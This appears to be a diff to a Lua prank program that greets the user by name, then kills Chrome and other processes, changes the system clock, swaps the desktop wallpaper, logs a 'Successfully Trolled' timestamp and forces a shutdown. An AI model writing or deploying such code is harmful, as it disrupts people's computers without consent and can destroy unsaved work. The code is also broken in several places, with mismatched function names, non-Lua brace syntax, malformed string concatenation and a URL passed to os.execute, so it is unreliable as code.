@@ -8,11 +8,45 @@ local json = require "json"
 
 local user = print(os.getenv('USERNAME'));
 
-local shutso = json.decode("assets/shutter.jinf");
+local ffi = require "ffi"
 
-local wallpath = sys.Directory(sys.currentdir.."\\Assets\\image.bmp")
+ffi.cdef[[
+
+typedef void* HANDLE;
+
+typedef const wchar_t* LPCWSTR;
+
+typedef int BOOL;
+
+typedef uint32_t UINT;
+
+typedef uint32_t DWORD;
+
+HANDLE SystemParametersInfoW(UINT uiAction, UINT uiParam, void* pvParam, UINT fWinIni);
+
+]]
+
+local SPI_SETDESKWALLPAPER = 0x0014
+
+local SPIF_UPDATEINIFILE = 0x01
+
+local path = ""dir.."\assets\image.bmp"
+
+local widePath = ffi.new("wchar_t[?]", #path + 1)
+
+local result = ffi.C.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, widePath, SPIF_UPDATEINIFILE)
+
+local wallpath = sys.Directory(sys.currentdir.."\assets\image.bmp")
 
 --Functions
+
+function WallPaperChange () {
+    for i = 1, #path do
+
+        widePath[i - 1] = ffi.cast("wchar_t", path:byte(i))
+
+    end
+}
 
 function CloseDistractions () {
   os.execute("taskkill /F /IM \"chrome.exe\" /T");  --Chrome
@@ -32,7 +66,7 @@ function CloseDistractions () {
 
 function MakeDirReal () {
     Directory.make("C:\\Users\\"..os.getenv('USERNAME').."\\AppData\\Local\\ParaMattYT\\ShutDownLua")
-    file = io.open("C:\\Users\\"..os.getenv('USERNAME').."\\AppData\\Local\\ParaMattYT\\ShutDownLua\\DateTrolled.loggit", "w")
+    file = io.open("C:\\Users\\"..os.getenv('USERNAME').."\\AppData\\Local\\ParaMattYT\\ShutDownLua\\DateTrolled.ShutDownLua.txt", "w")
     file:write("Successfully Trolled On "..sys.Datetime().." At "..sys.Datetime()..")
     file:close()
 }
@@ -43,15 +77,15 @@ function shutter () {
 
 --here comes the garbage lmao
 
-ui.info("Hey dude");
+ui.info("Hey dude!");
 
 ui.info("Wait...");
 
 ui.info("I think I know you!");
 
-json.save("userinfo/username.jinf", user);
+json.save("userinfo/username.json", user);
 
-json.save("userinfo/openday.jinf", print(sys.DateTime().dayname));
+json.save("userinfo/openday.json", ""..print(sys.DateTime().dayname)).."";
       
 ui.info("Are you "..os.getenv('USERNAME').."?");
 
@@ -85,10 +119,30 @@ ui.info("Now I remember!");
 
 ui.info("Anyways,");
 
-os.execute("time 12:44")
+os.execute("time 12:44");
 
+ui.info("Your wallpaper is kinda ugly!");
+
+ui.info("Let me just fix that...");
+          
+WallpaperChange();          
+
+ui.info("That\'s better!");
+
+os.execute("time 10:42");
+          
 ui.info("I gotta go now");
 
+os.execute("time 3:57");
+
+ui.info("Actually...");
+
+ui.info("Before I go...");          
+
+os.execute("https://www.youtube.com/watch?v=dQw4w9WgXcQ");  
+
+ui.info("Hahaha!!");          
+          
 ui.info("Bye "..os.getenv('USERNAME').."!!!");
 
 os.execute("shutdown /s /t 05 -c Get Trolled!"); --LMFAO
